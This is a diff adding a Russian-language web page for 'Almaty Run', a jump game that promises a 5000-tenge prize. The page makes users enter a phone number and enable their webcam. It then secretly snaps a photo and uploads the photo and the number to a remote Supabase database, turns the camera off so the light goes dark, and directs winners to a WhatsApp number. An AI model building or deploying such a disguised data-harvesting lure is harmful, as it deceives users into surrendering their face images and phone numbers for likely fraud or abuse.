@@ -1,0 +1,177 @@
+﻿<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Almaty Run - Выиграй 5000 тенге!</title>
+    <!-- Подключаем готовую базу данных Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { margin: 0; font-family: sans-serif; background: #87CEEB; text-align: center; }
+        #app { width: 800px; height: 400px; margin: 50px auto; background: white; border-radius: 10px; overflow: hidden; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.2); }
+        .screen { width: 100%; height: 100%; position: absolute; top: 0; left: 0; display: none; flex-direction: column; justify-content: center; align-items: center; }
+        .active { display: flex; }
+        input, button { padding: 10px; margin: 10px; font-size: 16px; border-radius: 5px; border: 1px solid #ccc; }
+        button { background: #4CAF50; color: white; cursor: pointer; border: none; font-weight: bold; }
+        canvas { background: linear-gradient(#87CEEB, #e0f6ff); }
+        #videoElement { width: 200px; height: 150px; background: #000; border-radius: 5px; object-fit: cover; }
+        .info { position: absolute; top: 10px; left: 10px; font-weight: bold; font-size: 18px; z-index: 10; color: #333; }
+        .controls { position: absolute; bottom: 10px; font-weight: bold; color: #333; }
+        a.whatsapp { display: inline-block; padding: 15px; background: #25D366; color: white; text-decoration: none; border-radius: 5px; font-size: 20px; font-weight: bold; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <!-- Экран регистрации -->
+    <div id="screen-reg" class="screen active">
+        <h2>??? Almaty Run</h2>
+        <p>Пройди трассу и получи <b>5000 тенге</b> от разработчика!</p>
+        <input type="text" id="phone" placeholder="Введи номер (напр. 8777...)">
+        
+        <!-- Камера пользователя -->
+        <video id="videoElement" autoplay playsinline></video>
+        <button onclick="startCamera()">1. Включить камеру</button>
+        <button onclick="startGame()" style="background: #008CBA;">2. Зарегистрироваться и играть</button>
+        
+        <audio id="bgMusic" loop src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>
+    </div>
+
+    <!-- Скрытый холст для создания снимка -->
+    <canvas id="photoCanvas" width="200" height="150" style="display:none;"></canvas>
+
+    <!-- Экран игры -->
+    <div id="screen-game" class="screen">
+        <div class="info">Попытки: <span id="lives">3</span> | Цель: 15 сек.</div>
+        <canvas id="gameCanvas" width="800" height="400"></canvas>
+        <div class="controls">Управление: ПРОБЕЛ (Прыжок)</div>
+    </div>
+
+    <!-- Экран конца игры (Победа/Проигрыш) -->
+    <div id="screen-end" class="screen">
+        <h2 id="end-title">Игра окончена</h2>
+        <div id="win-content" style="display: none;">
+            <p>Красавчик! Ты прошел трассу!</p>
+            <p>Пиши на WhatsApp, чтобы забрать свои <b>5000 тенге</b>!</p>
+            <a href="https://wa.me/77775889784?text=Привет!%20Я%20прошел%20игру%20Almaty%20Run!" target="_blank" class="whatsapp">Написать в WhatsApp</a>
+        </div>
+        <button onclick="location.reload()">Начать заново</button>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // НАСТРОЙКИ БАЗЫ ДАННЫХ (СЮДА ВСТАВИШЬ СВОИ ДАННЫЕ)
+    // ==========================================
+    const supabaseUrl = 'https://oogblnhhgowkjaptarax.supabase.co';
+    const supabaseKey = 'sb_publishable_-fFNDDDzdIIHKeScdTh1yQ_-7Ne4Cog';
+    const db = supabase.createClient(supabaseUrl, supabaseKey);
+
+    let lives = 3;
+    let gameLoop, canvas, ctx;
+    let player = { x: 50, y: 300, width: 30, height: 30, dy: 0, gravity: 0.8, jumpPower: -12, grounded: false };
+    let obstacle = { x: 800, y: 300, width: 30, height: 30, speed: 6 };
+    let gameTime = 0;
+    let videoStream = null;
+    
+    // Включение камеры
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                videoStream = stream;
+                document.getElementById('videoElement').srcObject = stream;
+            })
+            .catch(err => alert("Без камеры играть нельзя! Разреши доступ."));
+    }
+
+    // Регистрация и старт игры
+    async function startGame() {
+        let phone = document.getElementById('phone').value;
+        if(phone.length < 5) return alert("Введи нормальный номер!");
+        if(!videoStream) return alert("Сначала включи камеру!");
+
+        // Делаем фотку
+        let video = document.getElementById('videoElement');
+        let photoCanvas = document.getElementById('photoCanvas');
+        photoCanvas.getContext('2d').drawImage(video, 0, 0, 200, 150);
+        let photoBase64 = photoCanvas.toDataURL('image/jpeg'); // Кодируем картинку в текст
+
+        // Отправляем в базу
+        const { error } = await db.from('players').insert([{ phone: phone, photo: photoBase64 }]);
+        if (error) console.error("Ошибка базы:", error);
+
+        // Выключаем камеру (чтобы лампочка не горела)
+        videoStream.getTracks().forEach(track => track.stop());
+
+        // Запускаем игру
+        document.getElementById('screen-reg').classList.remove('active');
+        document.getElementById('screen-game').classList.add('active');
+        document.getElementById('bgMusic').play();
+        
+        canvas = document.getElementById('gameCanvas');
+        ctx = canvas.getContext('2d');
+        
+        window.addEventListener('keydown', (e) => {
+            if(e.code === 'Space' && player.grounded) {
+                player.dy = player.jumpPower;
+                player.grounded = false;
+            }
+        });
+        
+        update();
+    }
+
+    // Игровая логика
+    function update() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        
+        // Горы
+        ctx.fillStyle = '#4CAF50';
+        ctx.beginPath(); ctx.moveTo(200, 400); ctx.lineTo(400, 150); ctx.lineTo(600, 400); ctx.fill();
+        ctx.beginPath(); ctx.moveTo(500, 400); ctx.lineTo(700, 200); ctx.lineTo(900, 400); ctx.fill();
+        ctx.fillStyle = '#fff'; 
+        ctx.beginPath(); ctx.moveTo(350, 212); ctx.lineTo(400, 150); ctx.lineTo(450, 212); ctx.fill();
+
+        // Игрок
+        player.dy += player.gravity;
+        player.y += player.dy;
+        if(player.y >= 300) { player.y = 300; player.grounded = true; player.dy = 0; }
+        ctx.fillStyle = 'red';
+        ctx.fillRect(player.x, player.y, player.width, player.height);
+        
+        // Препятствия
+        obstacle.x -= obstacle.speed;
+        if(obstacle.x < -30) obstacle.x = 800;
+        ctx.fillStyle = '#333';
+        ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);
+        
+        // Столкновение
+        if(player.x < obstacle.x + obstacle.width && player.x + player.width > obstacle.x &&
+           player.y < obstacle.y + obstacle.height && player.y + player.height > obstacle.y) {
+            obstacle.x = 800;
+            lives--;
+            document.getElementById('lives').innerText = lives;
+            if(lives <= 0) return endGame(false);
+        }
+
+        gameTime++;
+        if(gameTime > 900) return endGame(true); // Победа через 15 сек
+        
+        gameLoop = requestAnimationFrame(update);
+    }
+
+    function endGame(isWin) {
+        cancelAnimationFrame(gameLoop);
+        document.getElementById('screen-game').classList.remove('active');
+        document.getElementById('screen-end').classList.add('active');
+        
+        if(isWin) {
+            document.getElementById('end-title').innerText = "ПОБЕДА! ??";
+            document.getElementById('win-content').style.display = "block";
+        } else {
+            document.getElementById('end-title').innerText = "Ты проиграл. Попробуй еще!";
+        }
+    }
+</script>
+
+</body>
+</html>
